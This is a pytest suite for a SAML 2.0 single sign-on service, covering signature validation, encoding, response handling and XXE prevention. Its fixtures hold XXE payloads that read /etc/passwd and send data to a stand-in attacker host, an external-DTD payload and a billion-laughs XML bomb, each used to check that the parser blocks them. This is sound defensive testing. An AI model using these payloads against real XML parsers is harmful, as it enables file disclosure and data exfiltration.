# -*- coding: utf-8 -*-
"""
Comprehensive Unit Tests for SAML 2.0 Service.

Tests for:
- AuthnRequest generation (XML structure, encoding)
- Deflate/inflate encoding roundtrip
- Signature validation (RSA-SHA256, RSA-SHA1, ECDSA, valid, invalid, missing)
- XXE attack prevention (defusedxml, malicious DTD rejection)
- Response handling flow
- Assertion extraction (NameID, attributes, conditions)
- Time validation (NotBefore, NotOnOrAfter, clock skew)
- User info extraction with attribute mapping
- Logout request generation
- SP metadata generation
- Error cases and edge conditions

SECURITY FOCUS:
- CWE-347: Signature validation MUST happen BEFORE assertion extraction
- CWE-611: XXE Prevention via defusedxml
- Signature algorithm validation (RSA, ECDSA)
- Missing signature when sign_assertions=True must fail
"""

import pytest
import base64
import zlib
from datetime import datetime, timedelta, timezone
from unittest.mock import AsyncMock, MagicMock, patch, PropertyMock
from uuid import uuid4, UUID
from xml.etree import ElementTree as StandardET

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, ec, padding
from cryptography.hazmat.backends import default_backend
from cryptography.x509.oid import NameOID

from app.services.auth.sso.saml_service import (
    SAMLService,
    SAMLRequest,
    SAMLAssertion,
    SAMLUserInfo,
    SAML_NS,
)
from app.services.auth.sso.sso_config_service import (
    SAMLConfig,
    SSOProviderConfig,
    SSOProviderType,
    SSOProviderPreset,
)


# ============================================================================
# Test Fixtures - Certificates and Keys
# ============================================================================


def generate_rsa_key_pair():
    """Generate an RSA key pair for testing."""
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend(),
    )
    return private_key


def generate_ec_key_pair():
    """Generate an EC key pair for testing (P-256)."""
    private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
    return private_key


def generate_test_certificate(private_key, common_name: str = "Test IdP") -> str:
    """Generate a self-signed X.509 certificate for testing."""
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "DE"),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Test"),
        x509.NameAttribute(NameOID.LOCALITY_NAME, "Test City"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Test Org"),
        x509.NameAttribute(NameOID.COMMON_NAME, common_name),
    ])

    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(private_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.utcnow())
        .not_valid_after(datetime.utcnow() + timedelta(days=365))
        .sign(private_key, hashes.SHA256(), default_backend())
    )

    return cert.public_bytes(serialization.Encoding.PEM).decode("utf-8")


@pytest.fixture
def rsa_key_pair():
    """RSA key pair fixture."""
    return generate_rsa_key_pair()


@pytest.fixture
def ec_key_pair():
    """EC key pair fixture."""
    return generate_ec_key_pair()


@pytest.fixture
def rsa_certificate(rsa_key_pair) -> str:
    """RSA certificate fixture."""
    return generate_test_certificate(rsa_key_pair)


@pytest.fixture
def ec_certificate(ec_key_pair) -> str:
    """EC certificate fixture."""
    return generate_test_certificate(ec_key_pair)


@pytest.fixture
def mock_db():
    """Create mock database session."""
    return AsyncMock()


@pytest.fixture
def mock_state_manager():
    """Create mock SSOStateManager for SAML."""
    from unittest.mock import AsyncMock, MagicMock
    manager = MagicMock()
    manager.store_saml_request = AsyncMock()
    manager.get_saml_request = AsyncMock(return_value=None)
    manager.delete_saml_request = AsyncMock(return_value=True)
    return manager


@pytest.fixture
def saml_service(mock_db, mock_state_manager):
    """Create SAML service instance with mocked StateManager."""
    return SAMLService(mock_db, state_manager=mock_state_manager)


@pytest.fixture
def saml_config(rsa_certificate) -> SAMLConfig:
    """Create a valid SAML configuration."""
    return SAMLConfig(
        idp_entity_id="https://idp.example.com/metadata",
        idp_sso_url="https://idp.example.com/sso",
        idp_slo_url="https://idp.example.com/slo",
        idp_certificate=rsa_certificate,
        sp_entity_id="https://sp.example.com/metadata",
        sp_acs_url="https://sp.example.com/acs",
        sp_slo_url="https://sp.example.com/slo",
        sign_assertions=True,
        sign_requests=True,
        attribute_mapping={
            "email": "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress",
            "name": "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name",
            "given_name": "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname",
            "family_name": "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname",
        },
    )


@pytest.fixture
def saml_config_unsigned(rsa_certificate) -> SAMLConfig:
    """Create a SAML configuration that does not require signatures."""
    return SAMLConfig(
        idp_entity_id="https://idp.example.com/metadata",
        idp_sso_url="https://idp.example.com/sso",
        idp_certificate=rsa_certificate,
        sp_entity_id="https://sp.example.com/metadata",
        sp_acs_url="https://sp.example.com/acs",
        sign_assertions=False,
        sign_requests=False,
        attribute_mapping={},
    )


@pytest.fixture
def mock_provider(saml_config) -> SSOProviderConfig:
    """Create a mock SSO provider configuration."""
    return SSOProviderConfig(
        id=uuid4(),
        company_id=uuid4(),
        name="Test SAML Provider",
        provider_type=SSOProviderType.SAML,
        preset=SSOProviderPreset.CUSTOM_SAML,
        enabled=True,
        saml_config=saml_config,
    )


# ============================================================================
# Helper Functions for Test Data Generation
# ============================================================================


def create_signed_saml_response(
    private_key,
    request_id: str,
    issuer: str = "https://idp.example.com/metadata",
    audience: str = "https://sp.example.com/metadata",
    name_id: str = "user@example.com",
    algorithm: str = "sha256",
    include_signature: bool = True,
    attributes: dict = None,
    not_before: datetime = None,
    not_on_or_after: datetime = None,
) -> str:
    """Create a SAML Response for testing (simplified)."""
    now = datetime.utcnow()
    not_before = not_before or now - timedelta(minutes=5)
    not_on_or_after = not_on_or_after or now + timedelta(minutes=30)

    attrs_xml = ""
    if attributes:
        attrs_xml = "<saml:AttributeStatement>"
        for attr_name, attr_values in attributes.items():
            attrs_xml += f'<saml:Attribute Name="{attr_name}">'
            for val in attr_values:
                attrs_xml += f"<saml:AttributeValue>{val}</saml:AttributeValue>"
            attrs_xml += "</saml:Attribute>"
        attrs_xml += "</saml:AttributeStatement>"

    # Build assertion XML
    assertion_xml = f"""<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_assertion_{uuid4().hex}" Version="2.0" IssueInstant="{now.strftime('%Y-%m-%dT%H:%M:%SZ')}">
        <saml:Issuer>{issuer}</saml:Issuer>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{name_id}</saml:NameID>
        </saml:Subject>
        <saml:Conditions NotBefore="{not_before.strftime('%Y-%m-%dT%H:%M:%SZ')}" NotOnOrAfter="{not_on_or_after.strftime('%Y-%m-%dT%H:%M:%SZ')}">
            <saml:AudienceRestriction>
                <saml:Audience>{audience}</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="{now.strftime('%Y-%m-%dT%H:%M:%SZ')}" SessionIndex="_session_{uuid4().hex}">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
        {attrs_xml}
    </saml:Assertion>"""

    # Build signature if required
    signature_xml = ""
    if include_signature:
        # Create a simplified SignedInfo for testing
        signed_info = f"""<ds:SignedInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
            <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
            <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-{algorithm}"/>
            <ds:Reference URI="">
                <ds:Transforms>
                    <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
                </ds:Transforms>
                <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#{algorithm}"/>
                <ds:DigestValue>dummydigest==</ds:DigestValue>
            </ds:Reference>
        </ds:SignedInfo>"""

        # Sign the SignedInfo
        signed_info_bytes = signed_info.encode("utf-8")

        if algorithm == "sha256":
            hash_algo = hashes.SHA256()
        elif algorithm == "sha1":
            hash_algo = hashes.SHA1()
        else:
            hash_algo = hashes.SHA256()

        if isinstance(private_key, rsa.RSAPrivateKey):
            signature = private_key.sign(
                signed_info_bytes,
                padding.PKCS1v15(),
                hash_algo,
            )
        else:
            signature = private_key.sign(signed_info_bytes, ec.ECDSA(hash_algo))

        signature_b64 = base64.b64encode(signature).decode("utf-8")

        signature_xml = f"""<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
            {signed_info}
            <ds:SignatureValue>{signature_b64}</ds:SignatureValue>
        </ds:Signature>"""

    # Build complete response
    response_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_response_{uuid4().hex}"
    Version="2.0"
    IssueInstant="{now.strftime('%Y-%m-%dT%H:%M:%SZ')}"
    InResponseTo="{request_id}"
    Destination="https://sp.example.com/acs">
    <saml:Issuer>{issuer}</saml:Issuer>
    {signature_xml}
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    {assertion_xml}
</samlp:Response>"""

    return response_xml


def create_xxe_attack_xml() -> str:
    """Create an XML with XXE attack payload for testing prevention."""
    return """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    <!ENTITY xxe2 SYSTEM "http://evil.attacker.com/steal?data=">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
    <Attack>&xxe;&xxe2;</Attack>
</samlp:Response>"""


def create_external_dtd_xml() -> str:
    """Create an XML with external DTD reference for testing XXE prevention."""
    return """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response SYSTEM "http://evil.attacker.com/malicious.dtd">
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
    <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://idp.example.com</saml:Issuer>
</samlp:Response>"""


# ============================================================================
# Test Class: AuthnRequest Generation
# ============================================================================


class TestAuthnRequestGeneration:
    """Tests for _generate_authn_request method."""

    def test_generate_authn_request_contains_required_elements(
        self, saml_service, saml_config
    ):
        """AuthnRequest enthaelt alle erforderlichen XML-Elemente."""
        request_id = "_id123456"
        issue_instant = "2026-01-31T12:00:00Z"

        xml = saml_service._generate_authn_request(
            saml_config, request_id, issue_instant
        )

        # Parse and verify structure
        assert "<?xml version" in xml
        assert "<samlp:AuthnRequest" in xml
        assert f'ID="{request_id}"' in xml
        assert 'Version="2.0"' in xml
        assert f'IssueInstant="{issue_instant}"' in xml
        assert f'Destination="{saml_config.idp_sso_url}"' in xml
        assert f'AssertionConsumerServiceURL="{saml_config.sp_acs_url}"' in xml
        assert f"<saml:Issuer>{saml_config.sp_entity_id}</saml:Issuer>" in xml

    def test_generate_authn_request_has_nameid_policy(
        self, saml_service, saml_config
    ):
        """AuthnRequest enthaelt NameIDPolicy mit konfiguriertem Format."""
        xml = saml_service._generate_authn_request(
            saml_config, "_id123", "2026-01-31T12:00:00Z"
        )

        assert "<samlp:NameIDPolicy" in xml
        assert f'Format="{saml_config.name_id_format}"' in xml
        assert 'AllowCreate="true"' in xml

    def test_generate_authn_request_unique_ids(
        self, saml_service, saml_config
    ):
        """Jeder AuthnRequest hat eine eindeutige ID."""
        xml1 = saml_service._generate_authn_request(
            saml_config, "_id1", "2026-01-31T12:00:00Z"
        )
        xml2 = saml_service._generate_authn_request(
            saml_config, "_id2", "2026-01-31T12:00:00Z"
        )

        assert 'ID="_id1"' in xml1
        assert 'ID="_id2"' in xml2
        assert 'ID="_id1"' not in xml2

    def test_generate_authn_request_protocol_binding(
        self, saml_service, saml_config
    ):
        """AuthnRequest verwendet HTTP-POST Binding."""
        xml = saml_service._generate_authn_request(
            saml_config, "_id1", "2026-01-31T12:00:00Z"
        )

        assert 'ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"' in xml


# ============================================================================
# Test Class: Deflate/Inflate Encoding
# ============================================================================


class TestDeflateInflateEncoding:
    """Tests for _deflate_and_encode and _decode_and_inflate methods."""

    def test_deflate_and_encode_produces_base64(self, saml_service):
        """Deflate/Encode erzeugt gueltiges Base64."""
        original = "<samlp:AuthnRequest>Test</samlp:AuthnRequest>"
        encoded = saml_service._deflate_and_encode(original)

        # Should be valid Base64
        try:
            decoded_bytes = base64.b64decode(encoded)
            assert len(decoded_bytes) > 0
        except Exception as e:
            pytest.fail(f"Invalid Base64 output: {e}")

    def test_deflate_and_encode_is_compressed(self, saml_service):
        """Deflate/Encode komprimiert die Daten."""
        original = "<samlp:AuthnRequest>" + "X" * 1000 + "</samlp:AuthnRequest>"
        encoded = saml_service._deflate_and_encode(original)

        # Compressed should be smaller than original (for repetitive data)
        decoded = base64.b64decode(encoded)
        assert len(decoded) < len(original)

    def test_encode_decode_roundtrip(self, saml_service):
        """Deflate/Inflate Roundtrip erhaelt Original."""
        original = '<?xml version="1.0"?><samlp:AuthnRequest>Test Content with Umlauts: aeoeue</samlp:AuthnRequest>'

        encoded = saml_service._deflate_and_encode(original)
        decoded = saml_service._decode_and_inflate(encoded)

        assert decoded == original

    def test_decode_uncompressed_data(self, saml_service):
        """Decode kann auch unkomprimierte Base64-Daten verarbeiten (POST Binding)."""
        original = "<samlp:Response>Test</samlp:Response>"
        # POST binding sends uncompressed Base64
        encoded = base64.b64encode(original.encode("utf-8")).decode("utf-8")

        decoded = saml_service._decode_and_inflate(encoded)

        assert decoded == original

    def test_decode_with_utf8_special_chars(self, saml_service):
        """Decode verarbeitet UTF-8 Sonderzeichen korrekt."""
        original = '<samlp:AuthnRequest>Deutsche Umlaute: Aeoeue</samlp:AuthnRequest>'

        encoded = saml_service._deflate_and_encode(original)
        decoded = saml_service._decode_and_inflate(encoded)

        assert decoded == original
        assert "Aeoeue" in decoded


# ============================================================================
# Test Class: Signature Validation (CWE-347 Security Tests)
# ============================================================================


class TestSignatureValidation:
    """
    Tests for _validate_signature method.

    SECURITY: These tests verify CWE-347 fix - signature validation MUST
    happen BEFORE assertion extraction to prevent SAML Response Forgery.
    """

    def test_validate_signature_rsa_sha256_valid(
        self, saml_service, saml_config, rsa_key_pair
    ):
        """Gueltige RSA-SHA256 Signatur wird akzeptiert."""
        request_id = "_id" + uuid4().hex
        response_xml = create_signed_saml_response(
            rsa_key_pair,
            request_id,
            algorithm="sha256",
        )

        # Use defusedxml to parse
        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        # Should not raise
        saml_service._validate_signature(root, saml_config)

    def test_validate_signature_rsa_sha1_deprecated_warning(
        self, saml_service, saml_config, rsa_key_pair
    ):
        """RSA-SHA1 Signatur loest Warnung aus aber wird akzeptiert."""
        request_id = "_id" + uuid4().hex
        response_xml = create_signed_saml_response(
            rsa_key_pair,
            request_id,
            algorithm="sha1",
        )

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        # Should not raise (SHA-1 is deprecated but still accepted)
        saml_service._validate_signature(root, saml_config)

    def test_validate_signature_ecdsa_valid(
        self, saml_service, ec_key_pair, ec_certificate
    ):
        """Gueltige ECDSA Signatur wird akzeptiert."""
        config = SAMLConfig(
            idp_entity_id="https://idp.example.com/metadata",
            idp_sso_url="https://idp.example.com/sso",
            idp_certificate=ec_certificate,
            sp_entity_id="https://sp.example.com/metadata",
            sp_acs_url="https://sp.example.com/acs",
            sign_assertions=True,
            attribute_mapping={},
        )

        request_id = "_id" + uuid4().hex
        response_xml = create_signed_saml_response(
            ec_key_pair,
            request_id,
            algorithm="sha256",
        )

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        # Should not raise for valid EC signature
        saml_service._validate_signature(root, config)

    def test_validate_signature_missing_when_required_fails(
        self, saml_service, saml_config, rsa_key_pair
    ):
        """Fehlende Signatur bei sign_assertions=True wird abgelehnt."""
        request_id = "_id" + uuid4().hex
        response_xml = create_signed_saml_response(
            rsa_key_pair,
            request_id,
            include_signature=False,
        )

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        with pytest.raises(ValueError) as exc_info:
            saml_service._validate_signature(root, saml_config)

        assert "muss signiert sein" in str(exc_info.value)

    def test_validate_signature_missing_when_not_required_passes(
        self, saml_service, saml_config_unsigned, rsa_key_pair
    ):
        """Fehlende Signatur bei sign_assertions=False wird akzeptiert."""
        request_id = "_id" + uuid4().hex
        response_xml = create_signed_saml_response(
            rsa_key_pair,
            request_id,
            include_signature=False,
        )

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        # Should not raise when sign_assertions=False
        saml_service._validate_signature(root, saml_config_unsigned)

    def test_validate_signature_invalid_signature_fails(
        self, saml_service, saml_config, rsa_key_pair
    ):
        """Ungueltige Signatur wird abgelehnt."""
        request_id = "_id" + uuid4().hex
        response_xml = create_signed_saml_response(
            rsa_key_pair,
            request_id,
            algorithm="sha256",
        )

        # Tamper with signature value
        response_xml = response_xml.replace(
            "<ds:SignatureValue>",
            "<ds:SignatureValue>AAAA",
        )

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        with pytest.raises(ValueError) as exc_info:
            saml_service._validate_signature(root, saml_config)

        assert "ungueltig" in str(exc_info.value).lower() or "fehlgeschlagen" in str(exc_info.value).lower()

    def test_validate_signature_wrong_certificate_fails(
        self, saml_service, rsa_key_pair
    ):
        """Signatur mit falschem Zertifikat wird abgelehnt."""
        # Generate a different key pair
        wrong_key = generate_rsa_key_pair()
        wrong_cert = generate_test_certificate(wrong_key)

        config = SAMLConfig(
            idp_entity_id="https://idp.example.com/metadata",
            idp_sso_url="https://idp.example.com/sso",
            idp_certificate=wrong_cert,  # Wrong cert
            sp_entity_id="https://sp.example.com/metadata",
            sp_acs_url="https://sp.example.com/acs",
            sign_assertions=True,
            attribute_mapping={},
        )

        # Sign with original key but validate with wrong cert
        request_id = "_id" + uuid4().hex
        response_xml = create_signed_saml_response(
            rsa_key_pair,  # Sign with original
            request_id,
            algorithm="sha256",
        )

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        with pytest.raises(ValueError):
            saml_service._validate_signature(root, config)

    def test_validate_signature_unsupported_algorithm_fails(
        self, saml_service, saml_config
    ):
        """Nicht unterstuetzter Algorithmus wird abgelehnt."""
        # Create XML with unsupported algorithm
        response_xml = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" InResponseTo="_id123">
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:SignedInfo>
            <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-md5"/>
        </ds:SignedInfo>
        <ds:SignatureValue>dummysig==</ds:SignatureValue>
    </ds:Signature>
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
        <saml:Issuer>test</saml:Issuer>
    </saml:Assertion>
</samlp:Response>"""

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        with pytest.raises(ValueError) as exc_info:
            saml_service._validate_signature(root, saml_config)

        assert "nicht unterstuetzt" in str(exc_info.value).lower()

    def test_validate_signature_incomplete_signature_fails(
        self, saml_service, saml_config
    ):
        """Unvollstaendige Signatur (fehlendes SignedInfo) wird abgelehnt."""
        response_xml = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" InResponseTo="_id123">
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:SignatureValue>dummysig==</ds:SignatureValue>
    </ds:Signature>
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
        <saml:Issuer>test</saml:Issuer>
    </saml:Assertion>
</samlp:Response>"""

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        with pytest.raises(ValueError) as exc_info:
            saml_service._validate_signature(root, saml_config)

        assert "unvollstaendig" in str(exc_info.value).lower()

    def test_validate_signature_invalid_certificate_fails(self, saml_service):
        """Ungueltiges Zertifikat wird abgelehnt."""
        config = SAMLConfig(
            idp_entity_id="https://idp.example.com/metadata",
            idp_sso_url="https://idp.example.com/sso",
            idp_certificate="INVALID_CERTIFICATE_DATA",
            sp_entity_id="https://sp.example.com/metadata",
            sp_acs_url="https://sp.example.com/acs",
            sign_assertions=True,
            attribute_mapping={},
        )

        response_xml = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" InResponseTo="_id123">
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:SignedInfo>
            <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        </ds:SignedInfo>
        <ds:SignatureValue>dummysig==</ds:SignatureValue>
    </ds:Signature>
</samlp:Response>"""

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        with pytest.raises(ValueError) as exc_info:
            saml_service._validate_signature(root, config)

        assert "zertifikat" in str(exc_info.value).lower()


# ============================================================================
# Test Class: XXE Prevention (CWE-611 Security Tests)
# ============================================================================


class TestXXEPrevention:
    """
    Tests for XXE attack prevention.

    SECURITY: These tests verify that defusedxml is used and XXE attacks
    are blocked (CWE-611 prevention).
    """

    def test_xxe_entity_attack_blocked(self, saml_service):
        """XXE Entity-Angriff wird blockiert."""
        malicious_xml = create_xxe_attack_xml()

        from defusedxml import ElementTree as ET

        # defusedxml should raise an error for XXE
        with pytest.raises(Exception) as exc_info:
            ET.fromstring(malicious_xml)

        # Should be a defusedxml security exception
        assert "EntitiesForbidden" in str(type(exc_info.value).__name__) or \
               "forbidden" in str(exc_info.value).lower() or \
               "entity" in str(exc_info.value).lower()

    def test_external_dtd_attack_blocked(self, saml_service):
        """Externer DTD-Angriff wird blockiert."""
        malicious_xml = create_external_dtd_xml()

        from defusedxml import ElementTree as ET

        with pytest.raises(Exception) as exc_info:
            ET.fromstring(malicious_xml)

        # Should be blocked by defusedxml
        error_str = str(exc_info.value).lower()
        assert "dtd" in error_str or "forbidden" in error_str or "doctype" in error_str

    def test_billion_laughs_attack_blocked(self, saml_service):
        """Billion Laughs (XML Bomb) Angriff wird blockiert."""
        # Simplified billion laughs attack
        billion_laughs = """<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<lolz>&lol2;</lolz>"""

        from defusedxml import ElementTree as ET

        with pytest.raises(Exception):
            ET.fromstring(billion_laughs)

    def test_saml_service_uses_defusedxml(self):
        """Verify SAML service imports defusedxml, not standard ElementTree."""
        import inspect
        import app.services.auth.sso.saml_service as saml_module

        source = inspect.getsource(saml_module)

        # Verify defusedxml is imported
        assert "from defusedxml import ElementTree" in source or \
               "from defusedxml" in source

        # Verify standard xml.etree is NOT used for parsing
        assert "from xml.etree.ElementTree import fromstring" not in source
        assert "xml.etree.ElementTree.fromstring" not in source


# ============================================================================
# Test Class: Response Handling Flow
# ============================================================================


class TestResponseHandling:
    """Tests for handle_response method."""

    @pytest.mark.asyncio
    async def test_handle_response_missing_in_response_to_fails(
        self, saml_service, mock_db
    ):
        """Fehlende InResponseTo wird abgelehnt."""
        response_xml = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" Version="2.0">
    <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://idp.example.com</saml:Issuer>
</samlp:Response>"""

        encoded = base64.b64encode(response_xml.encode()).decode()

        with pytest.raises(ValueError) as exc_info:
            await saml_service.handle_response(encoded, uuid4())

        assert "InResponseTo" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_handle_response_unknown_request_fails(
        self, saml_service, mock_db
    ):
        """Unbekannte Request-ID wird abgelehnt."""
        response_xml = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    Version="2.0" InResponseTo="_unknown_request_id">
</samlp:Response>"""

        encoded = base64.b64encode(response_xml.encode()).decode()

        with pytest.raises(ValueError) as exc_info:
            await saml_service.handle_response(encoded, uuid4())

        assert "ungueltig" in str(exc_info.value).lower() or "abgelaufen" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_handle_response_expired_request_fails(
        self, saml_service, mock_db, mock_provider, rsa_key_pair
    ):
        """Abgelaufene Anfrage wird abgelehnt."""
        # Create an expired request
        request_id = "_id" + uuid4().hex
        expired_request = SAMLRequest(
            request_id=request_id,
            provider_id=mock_provider.id,
            created_at=datetime.utcnow() - timedelta(hours=1),
            expires_at=datetime.utcnow() - timedelta(minutes=30),  # Expired
        )
        # Mock StateManager to return expired request
        saml_service.state_manager.get_saml_request = AsyncMock(return_value=expired_request)

        response_xml = create_signed_saml_response(
            rsa_key_pair,
            request_id,
        )
        encoded = base64.b64encode(response_xml.encode()).decode()

        with pytest.raises(ValueError) as exc_info:
            await saml_service.handle_response(encoded, mock_provider.company_id)

        assert "abgelaufen" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_handle_response_failed_status_fails(
        self, saml_service, mock_db, mock_provider
    ):
        """Fehlerstatus in Response wird abgelehnt."""
        request_id = "_id" + uuid4().hex
        valid_request = SAMLRequest(
            request_id=request_id,
            provider_id=mock_provider.id,
        )
        # Mock StateManager to return the request
        saml_service.state_manager.get_saml_request = AsyncMock(return_value=valid_request)

        # Mock get_provider
        with patch.object(saml_service.config_service, 'get_provider', new_callable=AsyncMock) as mock_get:
            mock_get.return_value = mock_provider

            response_xml = f"""<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    Version="2.0" InResponseTo="{request_id}">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Requester"/>
    </samlp:Status>
</samlp:Response>"""

            encoded = base64.b64encode(response_xml.encode()).decode()

            with pytest.raises(ValueError) as exc_info:
                await saml_service.handle_response(encoded, mock_provider.company_id)

            assert "fehlgeschlagen" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_handle_response_signature_before_extraction(
        self, saml_service, mock_db, mock_provider, rsa_key_pair
    ):
        """
        SECURITY: Signatur wird VOR Assertion-Extraktion validiert.

        This is critical for CWE-347 prevention.
        """
        request_id = "_id" + uuid4().hex
        valid_request = SAMLRequest(
            request_id=request_id,
            provider_id=mock_provider.id,
        )
        # Mock StateManager to return the request
        saml_service.state_manager.get_saml_request = AsyncMock(return_value=valid_request)

        # Track call order
        call_order = []

        original_validate = saml_service._validate_signature
        original_extract = saml_service._extract_assertion

        def track_validate(*args, **kwargs):
            call_order.append("validate_signature")
            return original_validate(*args, **kwargs)

        def track_extract(*args, **kwargs):
            call_order.append("extract_assertion")
            return original_extract(*args, **kwargs)

        with patch.object(saml_service.config_service, 'get_provider', new_callable=AsyncMock) as mock_get:
            mock_get.return_value = mock_provider

            with patch.object(saml_service.config_service, 'record_login', new_callable=AsyncMock):
                with patch.object(saml_service, '_validate_signature', side_effect=track_validate):
                    with patch.object(saml_service, '_extract_assertion', side_effect=track_extract):
                        response_xml = create_signed_saml_response(
                            rsa_key_pair,
                            request_id,
                            issuer=mock_provider.saml_config.idp_entity_id,
                            audience=mock_provider.saml_config.sp_entity_id,
                        )
                        encoded = base64.b64encode(response_xml.encode()).decode()

                        await saml_service.handle_response(encoded, mock_provider.company_id)

        # Signature validation MUST happen before extraction
        assert call_order.index("validate_signature") < call_order.index("extract_assertion"), \
            "Signature validation must happen BEFORE assertion extraction (CWE-347)"


# ============================================================================
# Test Class: Assertion Extraction
# ============================================================================


class TestAssertionExtraction:
    """Tests for _extract_assertion method."""

    def test_extract_assertion_basic_fields(self, saml_service, saml_config):
        """Basis-Felder werden korrekt extrahiert."""
        now = datetime.utcnow()
        response_xml = f"""<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Assertion ID="_assertion123" Version="2.0">
        <saml:Issuer>https://idp.example.com/metadata</saml:Issuer>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">user@example.com</saml:NameID>
        </saml:Subject>
        <saml:Conditions NotBefore="{now.strftime('%Y-%m-%dT%H:%M:%SZ')}" NotOnOrAfter="{(now + timedelta(hours=1)).strftime('%Y-%m-%dT%H:%M:%SZ')}">
            <saml:AudienceRestriction>
                <saml:Audience>https://sp.example.com/metadata</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="{now.strftime('%Y-%m-%dT%H:%M:%SZ')}" SessionIndex="_session456">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
    </saml:Assertion>
</samlp:Response>"""

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        assertion = saml_service._extract_assertion(root, saml_config)

        assert assertion.subject_name_id == "user@example.com"
